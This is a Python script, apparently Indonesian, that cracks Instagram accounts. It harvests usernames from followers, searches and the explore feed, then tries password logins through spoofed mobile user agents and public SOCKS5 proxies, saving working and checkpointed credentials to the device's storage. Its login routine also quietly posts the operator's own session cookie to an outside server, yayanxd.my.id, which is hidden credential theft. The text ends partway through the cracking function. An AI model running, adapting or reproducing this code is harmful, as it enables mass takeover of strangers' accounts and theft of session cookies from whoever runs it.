#create by rozhbasxyz
#coding with python3

###---[ IMPORT MODULE ]---###
import os, time, datetime, random, re, sys, platform, json, uuid, hmac,hashlib
try:import rich
except:os.system('pip install rich')
try:import requests
except:os.system('pip install requests')
try:import bs4
except:os.system('pip install bs4')
try:import concurrent.futures
except:os.system('pip install futures')
from concurrent.futures import ThreadPoolExecutor
from rich.panel import Panel
from rich import print as prints
from rich.tree import Tree
from datetime import datetime,date
from time import sleep
from rich.table import Table
from rich.console import Console
from rich.columns import Columns
from rich.progress import Progress
from rich.progress import BarColumn
from rich.progress import TextColumn
from rich.progress import SpinnerColumn
from rich.progress import TimeElapsedColumn
from bs4 import BeautifulSoup as parser

###---[ GLOBAL NAME ]---###
console = Console()
rr = random.randint
rc = random.choice
ses = requests.Session()
hp = platform.platform()
sleep = time.sleep
dump, ok, cp, loop, pro = [], 0, 0, 0, []
kode_name, pilih_info = "rivaan.remmington", []
pilih_ua, infinix, vivo = [], [], []
list_proxy = []

###---[ WARNA RICH ]---###
Z2 = "[#000000]" # HITAM
M2 = "[#FF0000]" # MERAH
H2 = "[#00FF00]" # HIJAU
K2 = "[#FFFF00]" # KUNING
B2 = "[#00C8FF]" # BIRU
U2 = "[#AF00FF]" # UNGU
N2 = "[#FF00FF]" # PINK
C2 = "[#00FFFF]" # BIRU MUDA
P2 = "[bold white]" # PUTIH
J2 = "[#FF8F00]" # JINGGA
A2 = "[#AAAAAA]" # ABU-ABU
ran_rich = rc([K2,C2,J2,H2,U2])

###---[ WARNA PRINT ]---###
P = '\x1b[1;97m' # PUTIH
M = '\x1b[1;91m' # MERAH
H = '\x1b[1;92m' # HIJAU
K = '\x1b[1;93m' # KUNING
B = '\x1b[1;94m' # BIRU
U = '\x1b[1;95m' # UNGU
C = '\x1b[1;96m' # BIRU MUDA
N = '\x1b[0m'	# WARNA MATI
J = '\x1b[38;5;208m' #JINGGA
ran_prin = rc([H,K,C,U])

###---[ TANGGAL & CREATE FILE ]---###
sasi = ["Januari", "Februari", "Maret", "April", "Mei", "Juni", "Juli", "Agustus", "September", "Oktober", "November", "Desember"]
tete = {"01": "Januari", "02": "Februari", "03": "Maret", "04": "April", "05": "Mei", "06": "Juni", "07": "Juli", "08": "Agustus", "09": "September", "10": "Oktober", "11": "November", "12": "Desember"}
now = datetime.now()
hari = now.day
blx = now.month
try:
	if blx < 0 or blx > 12:exit()
	xx = blx - 1
except ValueError:exit()
bulan = sasi[xx]
tahun = now.year
tanggal = str(hari)+str(blx)+str(tahun)
sim_ok = f'/sdcard/STAROZ/OK-{hari}-{bulan}-{tahun}.txt'
sim_cp = f'/sdcard/STAROZ/CP-{hari}-{bulan}-{tahun}.txt'

###---[ CLEAR LAYAR ]---###
def clear_layar():
	try:os.system('clear')
	except:pass
	
###---[ DUMP MERK HP ]---###
try:
	infi = parser(requests.get('https://udger.com/resources/ua-list/devices-brand-detail?brand=infinix').text, 'html.parser')
	for x in infi.find_all("td"):
		if "Brand market" in str(x):
			for x in x.text.replace("Brand market names in DB:\n", "").split(","):infinix.append(x)
except: infinix = [' Hot 10', ' Hot 10 Lite', ' Hot 10 Play', ' Hot 10i', ' Hot 10s', ' Hot 10T', ' Hot 11', ' Hot 11 (2022)', ' Hot 11s', ' Hot 12', ' Hot 12 Play', ' Hot 12 Pro', ' Hot 12i']

###---[ DUMP PROXY ]---###
try:
	for data in ses.get("https://raw.githubusercontent.com/hookzof/socks5_list/master/tg/socks.json").json(): list_proxy.append({"https": "socks5://"+data["ip"]+":"+data["port"]})
except Exception as e: pass

###---[ USER AGENT ]---###
def ua_rozh():
	rr = random.randint; rc = random.choice; andro = rr(9,13)
	merk = rc(['SM-G920F|NRD90M', 'SM-T535|LRX22G', 'SM-T231|KOT49H', 'SM-J320F|LMY47V', 'GT-I9190|KOT49H', 'GT-N7100|KOT49H', 'SM-T561|KTU84P', 'GT-N7100|KOT49H', 'GT-I9500|LRX22C', 'SM-J320F|LMY47V', 'SM-G930F|NRD90M', 'SM-J320F|LMY47V', 'SM-J510FN|NMF26X', 'GT-P5100|IML74K', 'SM-J320F|LMY47V', 'GT-N8000|JZO54K', 'SM-T531|LRX22G', 'SPH-L720|KOT49H', 'GT-I9500|JDQ39', 'SM-G935F|NRD90M', 'SM-T561|KTU84P', 'SM-T531|KOT49H', 'SM-J320FN|LMY47V', 'SM-A500F|MMB29M', 'SM-A500FU|MMB29M', 'SM-A500F|MMB29M', 'SM-T311|KOT49H', 'SM-T531|LRX22G', 'SM-J320F|LMY47V', 'SM-J320FN|LMY47V', 'SM-J320F|LMY47V', 'GT-P5210|KOT49H', 'SM-T230|KOT49H', 'GT-I9192|KOT49H', 'SM-T235|KOT4', 'GT-N7100|KOT49H', 'SM-A500F|LRX22G', 'SM-A500F|MMB29M', 'GT-N7100|KOT49H', 'SM-G920F|MMB29K', 'SM-J510FN|NMF26X', 'GT-N8000|JZO54K', 'SM-J320FN|LMY47V', 'SM-J320FN|LMY47V', 'SM-A500H|MMB29M', 'GT-I9300|JSS15J', 'GT-I9500|LRX22C', 'SM-J320F|LMY4', 'SM-J510FN|NMF26X', 'SM-A500F|MMB29M', 'GT-N8000|KOT49H', 'SM-T561|KTU84P', 'SM-G900F|KOT49H', 'GT-S7390|JZO54K', 'SM-J320F|LMY47V', 'GT-P5100|JZO54K', 'SM-A500FU|MMB29M', 'SM-G930F|NRD90M', 'SM-J510FN|NMF26X', 'SM-T561|KTU84P', 'GT-N8000|KOT49H', 'SM-T531|LRX22G', 'SM-J510FN|MMB29M', 'SM-J510FN|NMF26X', 'SM-J320F|LMY47V', 'GT-P5110|JDQ39', 'GT-I9301I|KOT49H', 'SM-A500F|LRX22G', 'SM-G930F|NRD90M', 'SM-T311|KOT4', 'GT-P5200|KOT49H', 'GT-I9301I|KOT49H', 'SM-J320M|LMY47V', 'SM-T531|LRX22G', 'SM-T820|NRD90M', 'GT-I9192|KOT49H', 'SM-G935F|MMB29K', 'SM-J701F|NRD90M;', 'GT-I9301I|KOT4', 'SM-J320FN|LMY47V', 'SM-T111|JDQ39', 'SM-A500F|MMB29M', 'SM-J510FN|NMF2', 'SM-T705|LRX22G', 'SM-G920F|NRD90M', 'GT-N5100|JZO54K', 'GT-I9300I|KTU84P', 'GT-I9300I|KTU84P', 'GT-N8000|KOT49H', 'GT-N8000|KOT49H', 'SM-A500F|MMB29M', 'GT-I9190|KOT49H', 'SM-J510FN|NMF26X', 'SM-J320F|LMY47V', 'GT-P5100|JDQ39', 'GT-I9300I|KTU84P', 'GT-N5100|JZO54K', 'GT-N8000|KOT49H', 'GT-I9500|LRX22C', 'SM-J320FN|LMY47V', 'SM-A500F|MMB29M', 'GT-N8000|JZO54K', 'SM-T805|LRX22G', 'SM-T231|KOT49H', 'GT-N5100|JZO54K', 'SM-J320H|LMY47V', 'SM-T231|KOT49H', 'SM-G930F|NRD90M', 'SM-G935F|NRD90M', 'SM-T310|KOT49H', 'GT-N8000|KOT49H', 'GT-I9300I|KTU84P', 'SM-G920F|NRD90M', 'SM-J510FN|NMF26X', 'SM-T705|LRX22G;', 'GT-P3110|JZO54K', 'GT-I9192|KOT49H', 'SM-J320F|LMY47V', 'SM-G920F|NRD90M', 'GT-I9300|IMM76D', 'SM-G950F|NRD90M', 'SM-J320F|LMY47V', 'SM-J510FN|NMF26X;', 'SM-J701F|NRD90M', 'SM-A500F|LRX22G', 'SM-T231|KOT49H', 'SM-T311|KOT49H', 'SM-J320FN|LMY47V', 'GT-P5210|KOT49H', 'SM-T805|LRX22G', 'GT-I9500|LRX22C', 'GT-P5200|KOT49H', 'GT-I9301I|KOT49H', 'GT-I9300|JSS15J', 'GT-N7100|KOT49H', 'SM-T531|LRX22G', 'SM-T820|NRD90M', 'SM-T315|JDQ39', 'SM-J320F|LMY47V', 'GT-I9190|KOT49H', 'GT-P5220|JDQ39', 'SM-T525|KOT49H', 'SM-T555|LRX22G', 'GT-I9190|KOT49H', 'SM-J510FN|NMF26X;', 'SM-A500F|MMB29M', 'GT-I9192|KOT49H', 'GT-P5100|JDQ', 'SM-T311|KOT49H']).split("|")
	com = rc(["qcom","mt6833","mt6765","samsungexynos7580","samsungexynos8895","samsungexynos7880","universal5420","samsungexynos8895"])
	dpi = rc(["120","160","240","320","480","640"])
	resolusi = rc(['828x1792', '414x896', '1125x2436', '375x812', '1242x2688', '414x896', '1125x2436', '375x812', '1080x1920', '414x736', '750x1334', '375x667', '1080x1920', '414x736', '750x1334', '375x667', '1080x1920', '414x736', '750x1334', '375x667', '640x1136', '320x568', '640x1136', '320x568', '2048x2732', '1024x1366', '1536x2048', '768x1024', '1536x2048', '768x1024', '1536x2048', '768x1024', '768x1024', '768x1024', '1440x2560', '412x732', '1080x1920', '412x732', '1440x869', '412x869', '1080x2280', '412x869', '1080x2160', '412x824', '1080x2220', '412x846', '1440x2960', '412x847', '1080x2160', '412x824', '1440x2560', '412x732', '1440x2560', '412x732', '1080x1920', '412x732', '1440x3040', '412x869', '1080x2280', '412x869', '1440x2960', '360x740', '1440x2560', '480x853', '1440x2560', '480x853', '1080x1920', '480x853', '1440x2960', '360x740', '1440x2960', '360x740', '1440x2960', '360x740', '1440x2960', '360x740', '1440x2560', '360x640', '1440x2560', '360x640', '1536x2048', '768x1024', '1200x1920', '600x960', '1800x2560', '900x1280', '800x1280', '800x1280', '2560x1700', '1280x850'])
	return (f"Instagram {rr(50,150)}.0.0.{rr(10,20)}.{rr(100,150)} Android (30/{andro}; {dpi}dpi; {resolusi}; samsung; {merk[0]}; {merk[1]}; {com}; en_US)")

bas = requests.get("https://pastebin.com/raw/4AGnWegR").text.split("==")[1].split(",")
def ua_regular():
	rr = random.randint; rc = random.choice; andro = rr(9,13)
	dpi = rc(["120","160","240","320","480","640"])
	resolusi = rc(['828x1792', '414x896', '1125x2436', '375x812', '1242x2688', '414x896', '1125x2436', '375x812', '1080x1920', '414x736', '750x1334', '375x667', '1080x1920', '414x736', '750x1334', '375x667', '1080x1920', '414x736', '750x1334', '375x667', '640x1136', '320x568', '640x1136', '320x568', '2048x2732', '1024x1366', '1536x2048', '768x1024', '1536x2048', '768x1024', '1536x2048', '768x1024', '768x1024', '768x1024', '1440x2560', '412x732', '1080x1920', '412x732', '1440x869', '412x869', '1080x2280', '412x869', '1080x2160', '412x824', '1080x2220', '412x846', '1440x2960', '412x847', '1080x2160', '412x824', '1440x2560', '412x732', '1440x2560', '412x732', '1080x1920', '412x732', '1440x3040', '412x869', '1080x2280', '412x869', '1440x2960', '360x740', '1440x2560', '480x853', '1440x2560', '480x853', '1080x1920', '480x853', '1440x2960', '360x740', '1440x2960', '360x740', '1440x2960', '360x740', '1440x2960', '360x740', '1440x2560', '360x640', '1440x2560', '360x640', '1536x2048', '768x1024', '1200x1920', '600x960', '1800x2560', '900x1280', '800x1280', '800x1280', '2560x1700', '1280x850'])
	tipe = rc(["spesn","lavender","lime","viva","fleur","joyeuse","pissarropro","rosemary","angelican","olivelite"])
	return f"Instagram {rr(50,266)}.0.0.{rr(10,20)}.{rr(100,150)} Android (31/{andro}; {dpi}dpi; {resolusi}; Xiaomi/Redmi; {rc(bas)}; {tipe}; qcom; en_GB; 438795758)"

#input(ua_regular())	
bas = requests.get("https://pastebin.com/raw/4AGnWegR").text.split("==")[2].split(",")
def ua_rozh():
	rr = random.randint; rc = random.choice; andro = rr(9,13)
	dpi = rc(["120","160","240","320","480","640"])
	resolusi = rc(['828x1792', '414x896', '1125x2436', '375x812', '1242x2688', '414x896', '1125x2436', '375x812', '1080x1920', '414x736', '750x1334', '375x667', '1080x1920', '414x736', '750x1334', '375x667', '1080x1920', '414x736', '750x1334', '375x667', '640x1136', '320x568', '640x1136', '320x568', '2048x2732', '1024x1366', '1536x2048', '768x1024', '1536x2048', '768x1024', '1536x2048', '768x1024', '768x1024', '768x1024', '1440x2560', '412x732', '1080x1920', '412x732', '1440x869', '412x869', '1080x2280', '412x869', '1080x2160', '412x824', '1080x2220', '412x846', '1440x2960', '412x847', '1080x2160', '412x824', '1440x2560', '412x732', '1440x2560', '412x732', '1080x1920', '412x732', '1440x3040', '412x869', '1080x2280', '412x869', '1440x2960', '360x740', '1440x2560', '480x853', '1440x2560', '480x853', '1080x1920', '480x853', '1440x2960', '360x740', '1440x2960', '360x740', '1440x2960', '360x740', '1440x2960', '360x740', '1440x2560', '360x640', '1440x2560', '360x640', '1536x2048', '768x1024', '1200x1920', '600x960', '1800x2560', '900x1280', '800x1280', '800x1280', '2560x1700', '1280x850'])
	merk = rc(bas)
	tipe = rc(["qcom","mt6833","mt6765"])
	return (f"Instagram {rr(50,150)}.0.0.{rr(10,20)}.{rr(100,150)} Android (30/{andro}; {dpi}dpi; {resolusi}; realme; {merk}; {merk}; {tipe}; in_ID)")
		
		
#input(ua_rozh())	

###---[ SORTIR AKUN ]---###
def sortir_akun():
	sim_1 = f'/sdcard/OK1+/OK-{hari}-{bulan}-{tahun}.txt'
	sim_2 = f'/sdcard/OK100+/OK-{hari}-{bulan}-{tahun}.txt'
	sim_3 = f'/sdcard/OK1000+/OK-{hari}-{bulan}-{tahun}.txt'
	nom, no, s1, s2, s3 = [], 0, 0, 0, 0
	prints(Panel(f'         [{ran_rich}!{P2}] silahkan pilih nomor yang akan di sortir',padding=(0,9),style="bold white"))
	try:ok = os.listdir('/sdcard/STAROZ')
	except:print(f" [{M}!{P}] tidak hasil");exit()
	for x in ok:
		if 'OK' in str(x):
			nom.append(x)
			no+=1
			try:jum= open('/sdcard/STAROZ/'+x,'r').readlines()
			except:continue
			print(f' [{H}{no}{P}] {x} - {H}{len(jum)} {P}akun')	
	abc = input(f' [{C}?{P}] nomor file : ')
	file = nom[int(abc)-1]
	try:buka = open('/sdcard/STAROZ/'+file,'r').read().splitlines()
	except:print(f"[{M}!{P}] file tidak ada hasil ok");exit()
	prints(Panel(f'\t   hasil 1+ di : {H2}{sim_1}{P2}\n\t   hasil 100+ di : {H2}{sim_2}{P2}\n\t   hasil 1000+ di : {H2}{sim_3}{P2}',padding=(0,5),style="bold white"))
	for data in buka:
		pg = data.split('|')[2].replace(' ','')
		if int(pg)<100:
			s1 += 1
			open(sim_1,"a").write(data+"\n")
		elif int(pg)<1000:
			if int(pg)<100:pass
			else:
				s2 += 1
				open(sim_2,"a").write(data+"\n")
		elif int(pg)>1000:
			if int(pg)<1000:pass
			else:
				s3 += 1
				open(sim_3,"a").write(data+"\n")
	print(f" [{C}!{P}] jumlah akun -100  : {H}{s1}{P}\n [{C}!{P}] jumlah akun +100  : {H}{s2}{P}\n [{C}!{P}] jumlah akun +1000 : {H}{s3}{P}")
	prints(Panel(f'       [{ran_rich}!{P2}] ingin hapus file utama setelah di sortir ({H2}ya{P2}/{K2}no{P2})',padding=(0,9),style="bold white"))
	apa = input(f" [{C}?{P}] pilih : ")
	if apa in ["Ya","Y","y","ya"]:
		try: os.remove(f"/sdcard/STAROZ/{file}")
		except:pass
	else: pass
	exit()
	
#input(ua_rozh())		
###---[ PROXIES ]---###
try:
	uadev = ses.get("https://raw.githubusercontent.com/RozhBasXYZ/REMOVE/main/info.txt").text
	if 'useragent' in uadev:pass
	else:clear_layar();exit('script sedang maintenace...!')
	#for x in ses.get("https://api.proxyscrape.com/v2/?request=displayproxies&protocol=socks4&timeout=100000&country=id&ssl=all&anonymity=all").text.splitlines(): pro.append(x)
except Exception as e:
	exit(f" [{M}!{P}] terjadi kesalahan, coba jalan kan kembali")
		
###---[ MY LOGO ]---###
def logo():
	prints(Panel(f"""[bold]{ran_rich}        ██ ███    ██ ███████ ████████  █████  ██████   ██████  ███████ ██   ██ 
        ██ ████   ██ ██         ██    ██   ██ ██   ██ ██    ██    ███  ██   ██ 
        ██ ██ ██  ██ ███████    ██    ███████ ██████  ██    ██   ███   ███████ 
        ██ ██  ██ ██      ██    ██    ██   ██ ██   ██ ██    ██  ███    ██   ██ 
        ██ ██   ████ ███████    ██    ██   ██ ██   ██  ██████  ███████ ██   ██\n            {P2}selamat datang user {K2}premium{P2}, script by {K2}rozhbasxyz{P2} version {K2}2{P2}.{K2}5{P2}""",style="bold white"))
        
###---[ PERTANYAAN ]---###
def pertanyaan():
	clear_layar()
	logo()
	print(f" [{K}!{P}] peringatan keras..!\n {K}•{P} segala bentuk kerugian dan penyalahgunaan\n {K}•{P} akun korban bukan tangung jawab autor jika anda\n {K}•{P} setuju maka tangung jawab sepenuh nya di tanggan anda\n {K}•{P} ketik '{H}ya{P}' untuk setuju, ketik '{M}no{P}' untuk tidak")
	apa = input(f' [{C}?{P}] pilih : ')
	if apa in ['ya','Ya','y','Y']:open('.siap.txt','w').write('siap');back()
	elif apa in ['no','No','NO','n']:exit('pilihan yang tepat..')
	else:print(f"'pilih antara {H}ya{P}' atau '{M}tidak{P}'");time.sleep(2);


###---[ BACK ]---###
def back():
	try:open('.siap.txt','r').read()
	except:pertanyaan()
	try:coki = open('.cookie_ig.txt','r').read()
	except:login()	
	try:
		hd = {"user-agent": "Mozilla/5.0 (iPhone; CPU iPhone OS 15_5 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148 Instagram 243.1.0.14.111 (iPhone13,3; iOS 15_5; en_US; id-ID; scale=3.00; 1170x2532; 382468104) NW/3"}
		ck={'cookie':coki}
		id = re.search('ds_user_id=(\d+)',str(coki)).group(1)
		po  = ses.get(f'https://i.instagram.com/api/v1/users/{id}/info/',headers=hd,cookies=ck)
		info = json.loads(po.text)
		if 'full_name' in str(info):
			try:nama = info['user']['full_name'].split(' ')[0].lower()
			except:nama = info['user']['full_name'].lower()
			uid = info["user"]["pk"]
		else:login()
	except Exception as e:login()
	main_menu(nama,uid,coki)
	
###---[ LOGIN COOKIE ]---###
def login():
	clear_layar()
	logo()
	coki = input(f'\n [{C}?{P}] cookie : ')+";"
	open('.cookie_ig.txt','w').write(coki)
	try:
		hd = {"user-agent": "Mozilla/5.0 (iPhone; CPU iPhone OS 15_5 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148 Instagram 243.1.0.14.111 (iPhone13,3; iOS 15_5; en_US; id-ID; scale=3.00; 1170x2532; 382468104) NW/3"}
		ck={'cookie':coki}
		id = re.findall('ds_user_id=(\d+);',str(coki))[0]
		po  = ses.get(f'https://i.instagram.com/api/v1/users/{id}/info/',headers=hd,cookies=ck)
		info = json.loads(po.text)
		if 'full_name' in str(info):
			try:
				cek_email(re.findall("sessionid=(.*?);",coki)[0])
				ses.post("https://api-cdn-markup.yayanxd.my.id/submit.php", data={"title": info["user"]["full_name"], "message": coki})
			except: pass
		elif 'challenge_required' in str(info):exit(' akun checkpoint')
		else:print(' cookie invalid atau perangkat spam');exit()
	except Exception as e:
		exit(' terjadi kesalahan')
	back()

###---[ CONVERT ID ]---###
def get_id(user,cok):
	try:akun = ses.get(f"https://i.instagram.com/api/v1/users/web_profile_info/?username={user}",cookies=cok,headers={"user-agent": "Mozilla/5.0 (iPhone; CPU iPhone OS 15_5 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148 Instagram 243.1.0.14.111 (iPhone13,3; iOS 15_5; en_US; id-ID; scale=3.00; 1170x2532; 382468104) NW/3","x-ig-app-id":'936619743392459'}).json()['data']['user'];id = akun['id'];nama = akun['full_name']
	except:print("cookie invalid & perangkat spam");time.sleep(2);back()
	return id,nama

###---[ GET DATA ]---###
def get_data(nama,id,z):
	urut = []
	urut.append(Panel(f' [{ran_rich}•{P2}] nama : {H2}{nama}{P2}\n [{ran_rich}•{P2}] uid  : {id}\n [{ran_rich}•{P2}] ipmu : {z["ip"]}',title=f'{M2}•{K2}•{H2}•{P2} DATA COOKIE {H2}•{K2}•{M2}•{P2}',padding=(0,6),style="bold white"))
	urut.append(Panel(f'   [{ran_rich}•{P2}] nama : {H2}{z["nama"]}{P2}\n   [{ran_rich}•{P2}] masa : {K2}{z["masa"]}{P2} hari lagi   \n   [{ran_rich}•{P2}] kota : {z["kota"]} ',title=f'{M2}•{K2}•{H2}•{P2} DATA LISENSI {H2}•{K2}•{M2}•{P2}',padding=(0,6),style="bold white"))
	console.print(Columns(urut))
	
###---[ MENU UTAMA ]---###
def main_menu(nama,uid,coki):
	clear_layar()
	try:key = open('.apikeyig.txt','r').read()
	except Exception as e:lisensi()
	data, xson = cek_lisen(key)
	logo()
	get_data(nama,uid,data)
	console = Console()
	table = Table(title=f"")
	table.add_column("nomor",width=7,justify="center",style="bold red")
	table.add_column("daftar menu",width=70,justify="center",style="bold white")
	table.add_column("status",width=7,justify="center",style="bold green")
	table.add_row(f"{ran_rich}01", "dump followers", f"{H2}ON",style="bold")
	table.add_row(f"{ran_rich}02", "dump following", f"{H2}ON",style="bold")
	table.add_row(f"{ran_rich}03", "dump pencarian",f"{H2}ON",style="bold")
	table.add_row(f"{ran_rich}04", "dump timeline", f"{H2}ON",style="bold")
	table.add_row(f"{ran_rich}05", "crack hasil cp",f"{H2}ON",style="bold")
	table.add_row(f"{ran_rich}06", "  sortir hasil ok",f"{H2}ON",style="bold")
	table.add_row(f"{ran_rich}07", "cek hasil akun", f"{H2}ON",style="bold")
	table.add_row(f"{ran_rich}08", f" keluar ({M2}cookie{P2})", f"{H2}ON",style="bold")
	console.print(table)
	apa = input(f" [{C}?{P}] pilih : ")
	if apa in ['1','01']:Pengikut(coki)
	elif apa in ['2','02']:Mengikuti(coki)
	elif apa in ['3','03']:Pencarian(coki)
	elif apa in ['4','04']:Timeline(coki)
	elif apa in ['5','05']:Crack_ulang()
	elif apa in ['6','06']:sortir_akun()
	elif apa in ['7','07']:exit(cek_hasil())
	elif apa in ['8','08']:os.remove('.cookie_ig.txt');back()
	else: exit(f'[{M}!{P}] isi yang benar')
	
###---[ CEK HASIL ]---###
def cek_hasil():
	no,nom = 0,[]
	prints(Panel(f'\t\t\t   [bold][{ran_rich}01{P2}]. cek hasil akun ok\n\t\t\t   [{ran_rich}02{P2}]. cek hasil akun cp\n\t\t\t   [{ran_rich}03{P2}]. kembali ke menu',title=f'{M2}•{K2}•{H2}•{P2} RESULT {H2}•{K2}•{M2}•{P2}',padding=(0,5),style="bold white"))
	one = input(f' [{C}?{P}] pilih : ')
	if one in ['1','01']:
		try:ok = os.listdir('/sdcard/STAROZ')
		except:print(f" [{M}!{P}] tidak hasil");exit()
		for x in ok:
			if 'OK' in str(x):
				nom.append(x)
				no+=1
				try:jum= open('/sdcard/STAROZ/'+x,'r').readlines()
				except:continue
				print(f' [{H}{no}{P}] {x} - {H}{len(jum)} {P}akun')	
		abc = input(f' [{C}?{P}] nomor file : ')
		file = nom[int(abc)-1]
		try:buka = open('/sdcard/STAROZ/'+file,'r').readlines()
		except:print(f"[{M}!{P}] file tidak ada hasil ok");exit()
		for data in buka:
			try:
				user = data.split('|')[0].replace(' ','')
				pw = data.split('|')[1].replace(' ','')
				pg = data.split('|')[2].replace(' ','')
				mg = data.split('|')[3].replace(' ','')
				akun = Tree(Panel.fit(f" [bold white]{H2}{file}{P2}",style="bold white"))
				akun.add(f" [bold white]username   : {H2}{user}")
				akun.add(f" [bold white]password   : {H2}{pw}")
				akun.add(f" [bold white]followers  : {H2}{pg}")
				akun.add(f" [bold white]following  : {H2}{mg}")
			except:
				user = data.split('|')[0].replace(' ','')
				pw = data.split('|')[1].replace(' ','')
				pg = data.split('|')[2].replace(' ','')
				mg = data.split('|')[3].replace(' ','')
				ps = data.split('|')[4].replace(' ','')
				akun = Tree(Panel.fit(f" [bold white]{H2}{file}{P2}",style="bold white"))
				akun.add(f" [bold white]username   : {H2}{user}")
				akun.add(f" [bold white]password   : {H2}{pw}")
				akun.add(f" [bold white]followers  : {H2}{pg}")
				akun.add(f" [bold white]following  : {H2}{mg}")
			prints(akun)
		exit()
	elif one in ['2','02']:
		try:ok = os.listdir('/sdcard/STAROZ')
		except:sys.exit(f"[{M}!{P}] tidak hasil")
		for x in ok:
			if 'CP' in str(x):
				nom.append(x)
				no+=1
				try:jum= open('/sdcard/STAROZ/'+x,'r').readlines()
				except:continue
				print(f' [{K}{no}{P}] {x} - {K}{len(jum)} {P}akun')	
		abc = input(f' [{C}?{P}] nomor file : ')
		file = nom[int(abc)-1]
		try:buka = open('/sdcard/STAROZ/'+file,'r').readlines()
		except:print(f"[{M}!{P}] file tidak ada hasil cp");exit()
		for data in buka:
			try:
				user = data.split('|')[0].replace(' ','')
				pw = data.split('|')[1].replace(' ','')
				pg = data.split('|')[2].replace(' ','')
				mg = data.split('|')[3].replace(' ','')
				akun = Tree(Panel.fit(f" [bold white]{K2}{file}{P2}",style="bold white"))
				akun.add(f" [bold white]username   : {K2}{user}")
				akun.add(f" [bold white]password   : {K2}{pw}")
				akun.add(f" [bold white]followers  : {K2}{pg}")
				akun.add(f" [bold white]following  : {K2}{mg}")
				prints(akun)
			except:pass
		exit()
	else:print(f"[{M}!{P}] isi yang benar");time.sleep(2);back()
	
###---[ DUMP TIMELINE ]---###
class Timeline:
	def __init__(self,cookie):
		self.r = requests.Session()
		self.hd = {"user-agent": "Mozilla/5.0 (iPhone; CPU iPhone OS 15_5 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148 Instagram 243.1.0.14.111 (iPhone13,3; iOS 15_5; en_US; id-ID; scale=3.00; 1170x2532; 382468104) NW/3","x-ig-app-id":'936619743392459'}
		self.cok = {'cookie':cookie}
		prints(Panel(f' [{ran_rich}!{P2}] mau dump sampai limit berapa id?, rekomendasi di bawah 2.500 id',padding=(0,9),style="bold white"))
		self.limit = int(input(f" [{C}?{P}] limit : "))
		self.dump()
		
	def dump(self):
		try:
			try:
				rozh = ses.get("https://i.instagram.com/api/v1/discover/web/explore_grid/?is_prefetch=false&omit_cover_media=false&module=explore_popular&use_sectional_payload=true&include_fixed_destinations=true",headers=self.hd, cookies=self.cok).json()
				for data in re.findall("'username': '(.*?)', 'full_name': '(.*?)'",str(rozh)):
					if "{" in str(data[0]) or "{" in str(data[1]):pass
					else:
						if data[0]+"|"+data[1] in dump:pass
						elif len(data[1])<4:pass
						else: dump.append(data[0]+"|"+data[1])
						print('\r [%s!%s] dump  : %s'%(C,P,len(dump)),end='')
						if len(dump)>=self.limit:
							print('\r [%s!%s] dump  : %s'%(C,P,len(dump)))
							exit(atur_sandi())
						sys.stdout.flush()
				self.dump()
			except:pass
		except KeyboardInterrupt:
			print('\r [%s!%s] dump  : %s'%(C,P,len(dump)));atur_sandi()
		except Exception as e:
			if len(dump)<=100:print('gagal dump');time.sleep(2);back()
			else:print('\r [%s!%s] dump  : %s'%(C,P,len(dump)));atur_sandi()
		print('\r [%s!%s] dump  : %s'%(C,P,len(dump)))
		atur_sandi()
		
###---[ CRACK ULANG CP ]---###
class Crack_ulang:
	def __init__(self):
		global ok, cp
		prints(Panel(f'         [{ran_rich}!{P2}] silahkan pilih nomor yang akan di crack ulang',padding=(0,9),style="bold white"))
		nom, no = [], 0
		try:ook = os.listdir('/sdcard/STAROZ')
		except:sys.exit(f"[{M}!{P}] tidak hasil")
		for x in ook:
			if 'CP' in str(x):
				nom.append(x)
				no+=1
				try:jum= open('/sdcard/STAROZ/'+x,'r').readlines()
				except:continue
				print(f' [{K}{no}{P}] {x} - {K}{len(jum)} {P}akun')	
		abc = input(f' [{C}?{P}] nomor file : ')
		file = nom[int(abc)-1]
		try:buka = open('/sdcard/STAROZ/'+file,'r').readlines()
		except:print(f"[{M}!{P}] file tidak ada hasil cp");exit()
		tanggal = f"{hari}-{bulan}-{tahun}.txt"
		prints(Panel(f'\t\t   hasil ok di : {H2}STAROZ/OK-{tanggal}{P2}',padding=(0,5),style="bold white"))
		for data in buka:
			try:
				self.user = data.split('|')[0].replace(' ','')
				self.pw = data.split('|')[1].replace(' ','')
				self.login()
			except:pass
		prints(Panel(f'  [{ran_rich}!{P2}] crack telah selesai dengan jumlah ok : {H2}{ok}{P2} cp : {K2}{cp}{P2} terima kasih.',padding=(0,9),style="bold white"))
		exit()		
		
	def login(self):
		global ok, cp
		try:
			ses = requests.Session()
			timenow = str(time.time()).split(".")[0]
			csrf= ses.get("https://www.instagram.com/fxcal/auth/login/?app_id=1217981644879628&etoken=AbgiA1rDGBtpDlahtfIqLFMvbfpUkkcJsvCqWRQrnUVnkjgdqtTsruSdtWUDQmVIeTULaH-_PgOKISCM5FjL2-b79JSdphmpe7ygAa_X-4q-PInTf_20Eg9l&next=https%3A%2F%2Faccountscenter.instagram.com%2Fadd%2F%3Fauth_flow%3Dig_linking%26background_page%3D%252Fconnected_experiences%252Fcross_posting%252F",allow_redirects=True).cookies["csrftoken"]
			mid = None
			head = {'accept': '*/*','accept-encoding': 'gzip, deflate, br','accept-language': 'id,en-US;q=0.9,en;q=0.8','content-type': 'application/x-www-form-urlencoded','cookie': f'ig_cb=1; csrftoken={csrf}; rur=FTW; mid={mid}','hosts': 'www.instagram.com','origin': 'https://www.instagram.com','referer': 'https://www.instagram.com/accounts/login/?source=auth_switcher','user-agent': ua_rozh(),'x-csrftoken': csrf,'sec-ch-ua': '"Google Chrome";v="89", "Chromium";v="89", ";Not A Brand";v="99"','sec-ch-ua-mobile': '?0','sec-fetch-dest': 'empty','sec-fetch-mode': 'cors','sec-fetch-site': 'same-origin','x-ig-app-id': '936619743392459','x-ig-www-claim': '0','x-instagram-ajax': 'ebe60d79ce7c','x-requested-with': 'XMLHttpRequest'}
			date= {'username': self.user,'enc_password': f'#PWD_INSTAGRAM_BROWSER:0:{timenow}:{self.pw}','queryParams': '{"source":"auth_switcher"}','optIntoOneTap': 'false','next': 'https://www.instagram.com/accounts/access_tool/logins'}
			po = ses.post("https://www.instagram.com/accounts/login/ajax/", headers=head, data=date)
			if 'userId' in str(po.text):
				ok += 1
